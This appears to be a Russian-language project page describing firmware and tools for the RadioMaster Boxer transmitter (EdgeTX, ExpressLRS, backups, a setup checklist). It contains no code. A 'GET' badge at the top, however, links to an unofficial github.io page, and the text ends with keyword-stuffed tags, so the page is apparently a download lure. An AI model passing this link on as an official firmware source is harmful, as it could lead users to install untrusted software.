# RadioMaster Boxer Tools & Firmware — инструменты и прошивки для RC-передатчика

<p align="center">
  <img src="https://www.flyingtech.co.uk/wp-content/uploads/2024/08/Boxer-Crush-Radio-Back.jpg" alt="RadioMaster Boxer" width="220">
</p>

[![GET — RADIOMASTER BOXER](https://img.shields.io/badge/GET-RADIOMASTER_BOXER-2563eb?style=for-the-badge)](https://r30575269.github.io/.github/RadioMaster-Boxer)

---

## Обзор проекта

**RadioMaster Boxer Tools & Firmware** — набор программного обеспечения и ресурсов для настройки, обновления и обслуживания RC-передатчиков серии **RadioMaster Boxer**. В зависимости от версии аппаратуры экосистема включает прошивку **EdgeTX**, инструменты EdgeTX Companion, SD Card Content и средства обслуживания встроенного или внешнего радиомодуля.

Для версии Boxer со встроенным **ExpressLRS** отдельно используется экосистема ELRS. **ExpressLRS Configurator** позволяет работать с firmware радиомодуля, выбирать подходящий Device Target и выполнять обновление поддерживаемыми способами. Настройки самого передатчика и моделей при этом относятся к EdgeTX.

Разделение этих компонентов важно: **EdgeTX firmware** управляет интерфейсом передатчика, моделями, микшерами и системными функциями, тогда как **ExpressLRS firmware** отвечает за встроенный или внешний ELRS RF-модуль. Обновление одного компонента не заменяет обновление другого.

---

## Основные компоненты

| Компонент | Назначение |
|---|---|
| **EdgeTX** | Основная прошивка RC-передатчика |
| **EdgeTX Companion** | Управление моделями, настройками и резервными копиями |
| **EdgeTX Flasher** | Установка и обслуживание поддерживаемых версий EdgeTX |
| **SD Card Content** | Системные ресурсы, Lua-скрипты, изображения и звуки |
| **ExpressLRS** | Firmware встроенного или внешнего ELRS RF-модуля |
| **ExpressLRS Configurator** | Сборка и установка firmware ELRS |
| **ELRS Web UI** | Настройка поддерживаемого ELRS-модуля через браузер |
| **Lua Scripts** | Управление функциями совместимых RF-систем |
| **Model Profiles** | Отдельные конфигурации для FPV-дронов и RC-моделей |
| **Backup / Restore** | Резервирование и восстановление конфигурации |

Перед установкой любого firmware необходимо определить точную аппаратную версию Boxer. Особенно важно различать варианты со встроенным **ExpressLRS** и другими RF-системами.

---

## EdgeTX и настройка RadioMaster Boxer

**EdgeTX** является основной программной платформой RadioMaster Boxer и отвечает за пользовательский интерфейс передатчика. Через неё настраиваются Inputs, Mixes, Outputs, Flight Modes, Logical Switches, Special Functions и параметры каждой RC-модели.

**EdgeTX Companion** позволяет работать с конфигурациями на компьютере. Его удобно использовать для резервирования моделей и подготовки настроек перед переносом на передатчик.

Дополнительные ресурсы располагаются на SD-карте. Версия **SD Card Content** должна соответствовать используемой версии EdgeTX, особенно после крупных обновлений firmware.

---

## ExpressLRS и встроенный ELRS-модуль

| Компонент | Что настраивается |
|---|---|
| **ExpressLRS Firmware** | Программное обеспечение RF-модуля |
| **Device Target** | Точная аппаратная цель для сборки firmware |
| **Binding Phrase** | Связывание совместимых TX и RX |
| **Packet Rate** | Поддерживаемая частота отправки пакетов |
| **Telemetry Ratio** | Параметры телеметрического канала |
| **Dynamic Power** | Автоматическое изменение мощности при поддержке |
| **Wi-Fi** | Конфигурация и обновление ELRS |
| **ELRS Lua** | Управление настройками радиомодуля с передатчика |

На Boxer ELRS необходимо отдельно следить за версиями **EdgeTX** и **ExpressLRS**. Это две самостоятельные прошивки, которые устанавливаются разными средствами и выполняют разные задачи.

Для обновления ELRS рекомендуется точно выбирать target, соответствующий внутреннему TX-модулю RadioMaster Boxer. Прошивка, предназначенная для другого устройства, не должна использоваться только из-за совпадения диапазона или производителя.

---

## Резервное копирование и обновление

Перед серьёзным обновлением полезно сохранить модели, настройки и содержимое SD-карты. Это позволяет быстро восстановить рабочую конфигурацию при переходе между версиями EdgeTX или после изменения структуры SD Card Content.

При обслуживании Boxer рекомендуется рассматривать систему как несколько отдельных компонентов: прошивку самого радио, SD-карту и firmware RF-модуля. Если используется внешний модуль, его прошивка также обслуживается отдельно.

После обновления необходимо проверить модели, порядок каналов, переключатели, Lua-скрипты, связь с приёмником, телеметрию и Failsafe. Для FPV-моделей особенно важно убедиться в правильной работе Arm и Flight Mode switches перед установкой пропеллеров.

---

## Быстрый старт

1. Определите точную аппаратную версию **RadioMaster Boxer**.
2. Проверьте установленную версию EdgeTX.
3. Создайте резервную копию моделей и настроек.
4. Сохраните копию содержимого SD-карты.
5. Обновите EdgeTX подходящим инструментом при необходимости.
6. Установите совместимый SD Card Content.
7. Для Boxer ELRS отдельно проверьте версию ExpressLRS.
8. Используйте правильный Device Target при обновлении ELRS.
9. Восстановите и проверьте модели, Lua-скрипты и настройки.
10. Проверьте RC-каналы, телеметрию, binding и Failsafe перед использованием.

---

# Tags

RadioMaster Boxer, RadioMaster Boxer tools, RadioMaster Boxer firmware, Boxer firmware, Boxer firmware update, RadioMaster firmware, RadioMaster tools, Boxer EdgeTX, RadioMaster Boxer EdgeTX, EdgeTX, EdgeTX firmware, EdgeTX Companion, EdgeTX Flasher, EdgeTX SD Card, Boxer SD Card Content, RadioMaster Boxer ELRS, Boxer ExpressLRS, ExpressLRS, ELRS, ExpressLRS Configurator, ELRS Configurator, Boxer ELRS firmware, Boxer ELRS update, ELRS Device Target, ELRS Binding Phrase, ELRS Lua, EdgeTX Lua, RadioMaster Boxer setup, RadioMaster Boxer configuration, Boxer backup, Boxer models, RC transmitter firmware, FPV radio, FPV transmitter, RC radio software
